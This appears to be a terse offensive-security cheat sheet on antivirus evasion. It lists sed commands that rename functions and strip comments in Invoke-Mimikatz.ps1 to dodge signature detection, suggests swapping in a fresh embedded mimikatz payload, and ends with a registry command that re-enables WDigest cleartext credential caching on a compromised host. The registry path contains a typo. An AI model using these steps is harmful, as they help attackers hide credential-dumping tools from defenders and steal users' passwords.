Perform antivirus activities bypass AV machines

# Invoke-Mimikatz.ps1 (obfuscated functions)

- sed -i -e 's/Invoke-Mimikatz/Invoke-LSASSscraper/g' Invoke-Mimikatz.ps1
- sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
- sed -i -e 's/DumpCreds/Dump/g' Invoke-Mimikatz.ps1
- sed -i -e 's/ArgumentPtr/Obf/g' Invoke-Mimikatz.ps1
- sed -i -e 's/CallDllMainSC1/ObfSC1/'g Invoke-Mimikatz.ps1
- sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1

#-# On Windows

Replace the $PESBytes64 with a new one of mimikatz
Lavereging the Steroids-Module for obfuscation


# Subverting mimikatz patch (on compromise machine to extract clear text password)

- add HKLM\SYSTEM\CurrentControlSet\Conttol\SecurityProviders\WDigest /v UserLogonCredential /t REG_DWORD /d 1 /f

